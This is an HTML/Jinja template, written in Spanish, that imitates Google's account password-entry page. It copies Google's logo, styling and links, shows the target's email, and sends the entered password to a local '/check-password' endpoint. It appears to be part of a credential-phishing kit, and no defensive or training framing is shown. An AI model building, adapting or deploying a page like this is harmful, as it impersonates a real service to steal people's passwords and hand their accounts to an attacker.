<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <title>Introduce tu contraseña - Cuenta de Google</title>
    <style>
        body{font-family:'Roboto',arial,sans-serif;margin:0;background:#fff;color:#202124;min-height:100vh;display:flex;flex-direction:column;align-items:center;}
        .header{padding:20px;width:100%;text-align:right;}
        .logo{margin:40px 0 20px;}
        .container{width:100%;max-width:450px;padding:48px 40px 36px;margin:0 auto;}
        .user-info{display:flex;align-items:center;background:#f8f9fa;padding:12px;border-radius:8px;margin-bottom:24px;}
        .avatar{width:40px;height:40px;background:#1a73e8;color:white;border-radius:50%;display:flex;align-items:center;justify-content:center;margin-right:12px;font-weight:500;}
        .email{flex-grow:1;font-weight:500;}
        .change-account{color:#1a73e8;text-decoration:none;}
        h1{font-size:24px;font-weight:400;margin-bottom:36px;}
        .input-field{width:100%;padding:13px 15px;font-size:16px;border:1px solid #dadce0;border-radius:4px;margin-bottom:24px;}
        .input-field:focus{outline:none;border:2px solid #1a73e8;padding:12px 14px;}
        .password-options{display:flex;justify-content:space-between;margin-bottom:48px;}
        .show-password{display:flex;align-items:center;}
        .forgot-password{color:#1a73e8;text-decoration:none;font-weight:500;}
        .buttons{display:flex;justify-content:space-between;}
        .back-button{color:#1a73e8;text-decoration:none;padding:10px 8px;}
        .next-button{background:#1a73e8;color:white;border:none;padding:10px 24px;border-radius:4px;cursor:pointer;}
        @media(max-width:480px){.container{padding:24px;}}
    </style>
</head>
<body>
    <div class="header">
        <a href="https://accounts.google.com/signup">Crear cuenta</a>
        <a href="https://mail.google.com">Gmail</a>
        <a href="https://images.google.com">Imágenes</a>
    </div>
    
    <div class="logo">
        <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_75x24dp.png" alt="Google" width="75" height="24">
    </div>
    
    <div class="container">
        <div class="user-info">
            <div class="avatar">{{ email[0].upper() if email else 'U' }}</div>
            <div class="email">{{ email }}</div>
            <a href="/" class="change-account">Cambiar de cuenta</a>
        </div>
        
        <h1>Introduce tu contraseña</h1>
        
        <form action="/check-password" method="post">
            <input type="password" class="input-field" name="password" placeholder="Introduce tu contraseña" required autofocus id="passwordInput">
            
            <div class="password-options">
                <div class="show-password">
                    <input type="checkbox" id="showPassword"> Mostrar contraseña
                </div>
                <a href="https://accounts.google.com/signin/recovery" class="forgot-password">¿Has olvidado tu contraseña?</a>
            </div>
            
            <div class="buttons">
                <a href="/" class="back-button">Atrás</a>
                <button type="submit" class="next-button">Siguiente</button>
            </div>
        </form>
    </div>
    
    <script>
        document.getElementById('showPassword').onchange = function() {
            document.getElementById('passwordInput').type = this.checked ? 'text' : 'password';
        };
    </script>
</body>
</html>
